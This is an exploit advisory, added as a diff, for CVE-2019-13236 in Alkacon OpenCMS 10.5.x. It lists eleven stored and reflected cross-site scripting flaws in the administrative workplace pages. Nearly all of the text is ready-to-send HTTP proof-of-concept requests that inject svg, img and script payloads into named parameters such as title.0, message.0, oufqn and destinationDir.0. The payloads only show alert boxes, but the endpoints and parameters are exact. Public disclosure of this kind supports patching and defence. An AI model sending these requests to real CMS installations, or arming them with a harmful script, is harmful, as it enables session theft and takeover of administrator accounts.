@@ -1,0 +1,135 @@
+# Exploit Title: Alkacon OpenCMS 10.5.x - Multiple XSS in Alkacon OpenCms
+Site Management
+# Google Dork: N/A
+# Date: 18/07/2019
+# Exploit Author: Aetsu
+# Vendor Homepage: http://www.opencms.org
+# Software Link: https://github.com/alkacon/opencms-core
+# Version: 10.5.x
+# Tested on: 10.5.5 / 10.5.4
+# CVE : CVE-2019-13236
+
+1. In Site Management > New site (Stored XSS):
+- Affected resource title.0:
+POC:
+```
+POST /system/workplace/admin/sites/new.jsp HTTP/1.1
+Host: example.com
+title.0=%3Csvg+onload%3Dalert%28%27Title%27%29%3E&sitename.0=%3Csvg+onload%3Dalert%28%27Folder+name%27%29%3E&se
+```
+2. In Treeview (Reflected XSS):
+- Affected resource type:
+POC:
+```
+http://example.com/opencms/system/workplace/views/explorer/tree_fs.jsp?type=
+</script><script>confirm(1)</script>&includefiles=true&showsiteselector=true&projectaware=false&treesite=
+```
+3. In Workspace tools > Login message (Stored XSS):
+- Affected resource message.0:
+POC:
+```
+POST /system/workplace/admin/workplace/loginmessage.jsp HTTP/1.1
+Host: example.com
+enabled.0=true&enabled.0.value=true&message.0=<svg
+onload=alert(1)>&loginForbidden.0.value=false&ok=Ok&elementname=undefined&path=%252Fworkplace%252Floginmessage&elementindex=0&action=save&closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fworkplace&style=new&page=page1&framename=
+```
+4. In Index sources > View index sources > New index source (Stored XSS):
+- Affected resource name.0:
+POC:
+```
+POST /system/workplace/admin/searchindex/indexsource-new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Csvg+onload%3Dalert%28%27Name%27%29%3E&indexerClassName.0=org.opencms.search.CmsVfsIndexer&ok=Ok&elementname=undefined&path=%252Fsearchindex%252Findexsources%252Findexsource-new&elementindex=0&action=save&closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fsearchindex%252Findexsources%2526action%253Dinitial&style=new&page=page1&framename=
+```
+5. In Index sources > View field configuration > New field configuration
+(Stored XSS):
+- Affected resource name.0:
+POC:
+```
+POST /system/workplace/admin/searchindex/fieldconfiguration-new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Csvg+onload%3Dalert%28%27Name%27%29%3E&ok=Ok&elementname=undefined&path=%252Fsearchindex%252Ffieldconfigurations%252Ffieldconfiguration-new&elementindex=0&action=save&closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fsearchindex%252Ffieldconfigurations%2526action%253Dinitial&style=new&page=page1&framename=
+```
+6. In Account Management > Impor/Export user data (Reflected XSS):
+- Affected resource oufqn:
+POC:
+```
+POST /system/workplace/admin/accounts/imexport_user_data/export_csv.jsp
+HTTP/1.1
+Host: example.com
+groups.0=Users&ok=Ok&oufqn=</script><script>confirm(1)</script>&elementname=undefined&path=%252Faccounts%252Forgunit%252Fimexport%252Fexportcsv&elementindex=0&action=save&closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Faccounts%252Forgunit%252Fimexport%2526action%253Dinitial&style=new&page=page1&framename=
+```
+7. In Account Management > Group Management > New Group (Stored XSS):
+- Affected resources name.0 and description.0:
+POC:```
+POST /system/workplace/admin/accounts/group_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27
+```
+8. In Account Management > Organizational Unit > Organizational Unit
+Management > New sub organizational unit (Stored XSS):
+- Affected resources parentOuDesc.0 and resources.0:
+POC:```
+POST /system/workplace/admin/accounts/unit_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27D
+```
+9. In Link Validator > External Link Validator > Validate External Links
+(Reflected XSS):
+- Affected resources reporttype, reportcontinuekey and title:
+POC:```
+POST
+/system/workplace/views/admin/admin-main.jsp?path=%2Flinkvalidation%2Fexternal%2Fvalidateexternallinks
+HTTP/1.1
+Host: example.com
+dialogtype=imp&reporttype=extended66955%22%3balert(1)%2f%2f297&reportcontinuekey=&title=External%2BLink%2BValidation&path=%252Flinkvalidation%252Fexternal%252Fvalidateexternallinks&threadhasnext=&action=confirmed&closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Flinkvalidation%252Fexternal&style=new&framename=&ok=OK
+```
+10. In Administrator view > Database management > Extended html import >
+Default html values (Reflected XSS):
+- Affected resources destinationDir.0, imageGallery.0, linkGallery.0,
+downloadGallery.0:
+POC:```
+POST /system/workplace/admin/database/htmlimport/htmldefault.jsp HTTP/1.1
+Host: example.com
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name="inputDir.0"
+.
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name="destinationDir.0"
+/whbo0"><script>alert(1)</script>nrbhd
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name="imageGallery.0"
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name="downloadGallery.0"
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name="linkGallery.0"
+[...]
+```
+11. In Administrator view > Database management > Extended html import >
+Default html values (Reflected XSS):
+- Affected resources destinationDir.0, imageGallery.0, linkGallery.0 and
+downloadGallery.0:
+POC:
+```
+POST /system/workplace/admin/database/htmlimport/htmlimport.jsp HTTP/1.1
+Host: example.com
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name="inputDir.0"
+gato
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name="destinationDir.0"
+testszfgw"><script>alert(1)</script>vqln7
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name="imageGallery.0"
+test
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name="downloadGallery.0"
+test
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name="linkGallery.0"
+test
+[...]
+```
+
+
+Extended POCs: https://aetsu.github.io/OpenCms
